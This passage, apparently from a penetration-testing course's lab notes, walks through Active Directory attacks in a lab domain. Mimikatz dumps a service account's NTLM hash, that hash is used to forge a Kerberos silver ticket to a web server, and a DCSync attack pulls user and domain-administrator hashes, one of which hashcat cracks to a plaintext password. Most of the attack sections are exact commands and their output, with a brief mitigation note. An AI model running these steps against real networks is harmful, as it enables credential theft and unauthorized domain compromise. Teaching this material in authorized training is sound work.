### 401 - Unauthorized: Access is Denied
**Error Message:**
- **401 - Unauthorized:** Access is denied due to invalid credentials.
- **Details:** You do not have permission to view this directory or page using the credentials that you supplied.

**Command and Error Output:**
```powershell
iwr -UseBasicParsing -UseDefaultCredentials http://web04
```
**Error:**
```plaintext
At line:1 char:1
+ iwr -UseBasicParsing -UseDefaultCredentials http://web04
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+ CategoryInfo          : InvalidOperation: (System.Net.HttpWebRequest:HttpWebRequest) [Invoke-WebRequest], WebException
+ FullyQualifiedErrorId : WebCmdletWebResponseException,Microsoft.PowerShell.Commands.InvokeWebRequestCommand
```

**References:**
- [Microsoft Documentation (2022)](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-pac/166d8064-c863-41e1-9c23-edaaa5f36962)
- [Microsoft Documentation (2021)](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-apds/1d1f2b0c-8e8a-4d2a-8665-508d04976f84)
- [Active Directory Security (2015)](https://adsecurity.org/?p=2011)
- [Microsoft Documentation (2022)](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/invoke-webrequest?view=powershell-7.2)

---

### Attempting to Access the Web Page on WEB04 as User Jeff

**Listing 815:**
```plaintext
PS C:\> iwr -UseDefaultCredentials http://web04
```
**Output:**
- **StatusCode:** 401
- **StatusDescription:** Unauthorized

**Conclusion:**
- We cannot access the web page as `jeff`. Let’s start collecting the information needed to forge a silver ticket.

### Retrieving the SPN Password Hash with Mimikatz

Since we are a local Administrator on this machine where `iis_service` has an established session, we can use Mimikatz to retrieve the SPN password hash (NTLM hash of `iis_service`), which is the first piece of information we need to create a silver ticket.

**Steps:**
1. Start PowerShell as Administrator.
2. Launch Mimikatz.
3. Use `privilege::debug` and `sekurlsa::logonpasswords` to extract cached AD credentials.

**Mimikatz Commands:**
```plaintext
mimikatz # privilege::debug
Privilege '20' OK
mimikatz # sekurlsa::logonpasswords
```

**Output:**
```plaintext
Authentication Id : 0 ; 1147751 (00000000:00118367)
Session : Service from 0
User Name : iis_service
Domain : CORP
Logon Server : DC1
Logon Time : 9/14/2022 4:52:14 AM
SID : S-1-5-21-1987370270-658905905-1781884369-1109
msv :
[00000003] Primary
* Username : iis_service
* Domain : CORP
* NTLM : 4d28cf5252d39971419580a51484ca09
* SHA1 : ad321732afe417ebbd24d5c098f986c07872f312
* DPAPI : 1210259a27882fac52cf7c679ecf4443
...
```

**Listing 816:**
- The NTLM hash of the `iis_service` user account is `4d28cf5252d39971419580a51484ca09`.

### Obtaining the Domain SID

**Command:**
```powershell
PS C:\Users\jeff> whoami /user
```

**Output:**
```plaintext
USER INFORMATION
----------------
User Name   SID
==========  =============================================
corp\jeff   S-1-5-21-1987370270-658905905-1781884369-1105
```

**Listing 817:**
- The domain SID is `S-1-5-21-1987370270-658905905-1781884369`.

### Target SPN

For this example, we will target the HTTP SPN resource on `WEB04` (HTTP/web04.corp.com:80) because we want to access the web page running on IIS.

### Creating the Silver Ticket

Now that we have collected all three pieces of information, we can build the command to create a silver ticket with Mimikatz.

**Mimikatz Command:**
```plaintext
mimikatz # kerberos::golden /sid:S-1-5-21-1987370270-658905905-1781884369 /domain:corp.com /ptt /target:web04.corp.com /service:http /rc4:4d28cf5252d39971419580a51484ca09 /user:jeffadmin
```

**Output:**
```plaintext
User : jeffadmin
Domain : corp.com (CORP)
SID : S-1-5-21-1987370270-658905905-1781884369
User Id : 500
Groups Id : *513 512 520 518 519
ServiceKey: 4d28cf5252d39971419580a51484ca09 - rc4_hmac_nt
Service : http
Target : web04.corp.com
Lifetime : 9/14/2022 4:37:32 AM ; 9/11/2032 4:37:32 AM ; 9/11/2032 4:37:32 AM
-> Ticket : ** Pass The Ticket **
* PAC generated
* PAC signed
* EncTicketPart generated
* EncTicketPart encrypted
* KrbCred generated
Golden ticket for 'jeffadmin @ corp.com' successfully submitted for current session
```

**Listing 818:**
- A new service ticket for the SPN `HTTP/web04.corp.com` has been loaded into memory.

### Confirming the Silver Ticket

**Command:**
```powershell
PS C:\Tools> klist
```

**Output:**
```plaintext
Current LogonId is 0:0xa04cc
Cached Tickets: (1)
#0> Client: jeffadmin @ corp.com
Server: http/web04.corp.com @ corp.com
KerbTicket Encryption Type: RSADSI RC4-HMAC(NT)
Ticket Flags 0x40a00000 -> forwardable renewable pre_authent
Start Time: 9/14/2022 4:37:32 (local)
End Time: 9/11/2032 4:37:32 (local)
Renew Time: 9/11/2032 4:37:32 (local)
Session Key Type: RSADSI RC4-HMAC(NT)
Cache Flags: 0
Kdc Called:
```

**Listing 819:**
- The silver ticket for `jeffadmin` to access `http/web04.corp.com` is submitted to the current session.

### Verifying Access

**Command:**
```powershell
PS C:\Tools> iwr -UseDefaultCredentials http://web04
```

**Output:**
```plaintext
StatusCode : 200
StatusDescription : OK
Content : 
tagName=A;
href=http://go.microsoft.com/fwlink/?linkid=66138&amp;clcid=0x409}}
ParsedHtml :
RawContentLength : 703
```

**Listing 820:**
- We successfully forged a service ticket and gained access to the web page as `jeffadmin`.

### Notes on Forging Service Tickets

- Once we have access to the password hash of the SPN, a machine account, or a user, we can forge related service tickets for any users and permissions.
- This is a powerful technique for accessing SPNs in later phases of a penetration test, as we often need privileged access to retrieve the password hash of the SPN.

### Mitigations

- Microsoft created a security patch to update the PAC structure, mitigating the capability to forge tickets for non-existent domain users if the client and the KDC are in the same domain.
- This patch was enforced from October 11, 2022.

### DCSync Attack

**Objective:**
- Perform a DCSync attack to obtain user credentials by impersonating a domain controller.

**Prerequisites:**
- Access to a user account with the necessary rights (e.g., Domain Admins, Enterprise Admins, Administrators).

**Mimikatz Command:**
```plaintext
mimikatz # lsadump::dcsync /user:corp\dave
```

**Output:**
```plaintext
[DC] 'corp.com' will be the domain
[DC] 'DC1.corp.com' will be the DC server
[DC] 'corp\dave' will be the user account
[rpc] Service : ldap
[rpc] AuthnSvc : GSS_NEGOTIATE (9)
Object RDN : dave
** SAM ACCOUNT **
SAM Username : dave
Account Type : 30000000 ( USER_OBJECT )
User Account Control : 00410200 ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD DONT_REQUIRE_PREAUTH )
Account expiration :
Password last change : 9/7/2022 9:54:57 AM
Object Security ID : S-1-5-21-1987370270-658905905-1781884369-1103
Object Relative ID : 1103
Credentials:
Hash NTLM: 08d7a47a6f9f66b97b1bae4178747494
ntlm- 0: 08d7a47a6f9f66b97b1bae4178747494
ntlm- 1: a11e808659d5ec5b6c4f43c1e5a0972d
lm - 0: 45bc7d437911303a42e764eaf8fda43e
lm - 1: fdd7d20efbcaf626bd2ccedd49d9512d
...
```

**Listing 821:**
- Mimikatz performed the DCSync attack and obtained the user credentials of `dave`.

### Cracking the NTLM Hash

**Command:**
```bash
kali@kali:~$ hashcat -m 1000 hashes.dcsync /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
```

**Output:**
```plaintext
08d7a47a6f9f66b97b1bae4178747494:Flowers1
```

**Listing 822:**
- We successfully retrieved the plaintext password of `dave`.

### Obtaining the Domain Administrator's Credentials

**Mimikatz Command:**
```plaintext
mimikatz # lsadump::dcsync /user:corp\Administrator
```

**Output:**
```plaintext
Credentials:
Hash NTLM: 2892d26cdf84d7a70e2eb3b9f05c425e
...
```

**Listing 823:**
- We obtained the NTLM hash of the domain administrator `Administrator`.

### Lateral Movement Vectors

- We can leverage NTLM hashes obtained by DCSync for lateral movement, such as passing the hash or using other techniques to gain further access within the domain.

---

**Copyright Notice:**
- PWK - Copyright © 2023 OffSec Services Limited. All rights reserved.
- Made in Morocco
- Penetration Testing with Kali Linux